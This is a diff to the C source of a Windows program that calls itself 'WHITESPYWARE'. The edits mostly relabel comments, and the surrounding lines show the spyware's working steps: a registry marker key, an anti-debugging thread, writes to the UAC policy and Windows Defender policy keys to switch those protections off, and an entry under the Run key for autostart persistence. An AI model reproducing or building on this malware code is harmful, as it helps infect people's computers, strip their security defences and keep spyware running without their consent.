@@ -27,7 +27,7 @@ DWORD main(int argc, char* argv[]) {
 	HKEY RegKey = NULL;
 	LONG result = 0;
 
-	//Running
+	//Detected - Running
 	result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\WHITESPYWARE"), 0, KEY_ALL_ACCESS, &RegKey);
 	if (result == ERROR_SUCCESS) {
 		CloseHandle(RegKey);
@@ -37,7 +37,7 @@ DWORD main(int argc, char* argv[]) {
 	HANDLE Thread[2];
 	Thread[0] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)checkDebugger, NULL, 0, NULL);
 
-	//First Run
+	//Detected - First Run
 	DWORD dwDisp = 0;
 	result = RegCreateKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\WHITESPYWARE"), 0, NULL, REG_OPTION_VOLATILE, KEY_ALL_ACCESS, NULL, &RegKey, &dwDisp);
 	if (result != ERROR_SUCCESS) {
@@ -82,7 +82,7 @@ DWORD main(int argc, char* argv[]) {
 
 	result = 0;
 
-	//Auto Run
+	//Disable UAC
 	HKEY UACkey = NULL;
 	DWORD UACvalue = 0;
 	result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 0, KEY_ALL_ACCESS, &UACkey);
@@ -101,8 +101,7 @@ DWORD main(int argc, char* argv[]) {
 	}
 	CloseHandle(UACkey);
 
-	//Disable Windows Defender   --->   Register The Spyware Exception
-
+	//Disable Windows Defender
 	HKEY WD = NULL;
 	DWORD WDvalue = 1;
 	result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Policies\\Microsoft\\Windows Defender"), 0, KEY_ALL_ACCESS, &WD);
@@ -121,6 +120,7 @@ DWORD main(int argc, char* argv[]) {
 	}
 	CloseHandle(WD);
 
+	//Auto Run
 	HKEY autokey = NULL;
 	result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_ALL_ACCESS, &autokey);
 	if (result != ERROR_SUCCESS) {
